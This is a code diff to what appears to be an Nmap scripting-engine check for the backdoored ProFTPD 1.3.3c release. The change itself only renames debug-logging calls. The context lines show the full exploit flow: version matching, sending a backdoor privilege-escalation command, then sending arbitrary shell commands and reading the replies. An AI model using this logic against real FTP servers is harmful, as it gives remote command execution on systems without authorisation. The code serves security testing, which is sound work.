@@ -62,7 +62,7 @@ action = function(host, port)
   sock:set_timeout(5000)
   status, err = sock:connect(host, port, "tcp")
   if not status then
-    stdnse.print_debug(1, "Can't connect: %s", err)
+    stdnse.debug1("Can't connect: %s", err)
     sock:close()
     return
   end
@@ -71,21 +71,21 @@ action = function(host, port)
   local buffer = stdnse.make_buffer(sock, "\r?\n")
   local code, message = ftp.read_reply(buffer)
   if not code then
-    stdnse.print_debug(1, "Can't read banner: %s", message)
+    stdnse.debug1("Can't read banner: %s", message)
     sock:close()
     return
   end
 
   -- Check version.
   if not message:match("ProFTPD 1.3.3c") then
-    stdnse.print_debug(1, "This version is not known to be backdoored.")
+    stdnse.debug1("This version is not known to be backdoored.")
     return
   end
 
   -- Send command to escalate privilege.
   status, err = sock:send(CMD_FTP .. "\r\n")
   if not status then
-    stdnse.print_debug(1, "Failed to send privilege escalation command: %s", err)
+    stdnse.debug1("Failed to send privilege escalation command: %s", err)
     sock:close()
     return
   end
@@ -93,7 +93,7 @@ action = function(host, port)
   -- Check if escalation worked.
   code, message = ftp.read_reply(buffer)
   if code and code == 502 then
-    stdnse.print_debug(1, "Privilege escalation failed: %s", message)
+    stdnse.debug1("Privilege escalation failed: %s", message)
     sock:close()
     return
   end
@@ -101,7 +101,7 @@ action = function(host, port)
   -- Send command(s) to shell.
   status, err = sock:send(cmd .. ";\r\n")
   if not status then
-    stdnse.print_debug(1, "Failed to send shell command(s): %s", err)
+    stdnse.debug1("Failed to send shell command(s): %s", err)
     sock:close()
     return
   end
@@ -109,7 +109,7 @@ action = function(host, port)
   -- Check for an error from command.
   status, resp = sock:receive()
   if not status then
-    stdnse.print_debug(1, "Can't read command response: %s", resp)
+    stdnse.debug1("Can't read command response: %s", resp)
     sock:close()
     return
   end
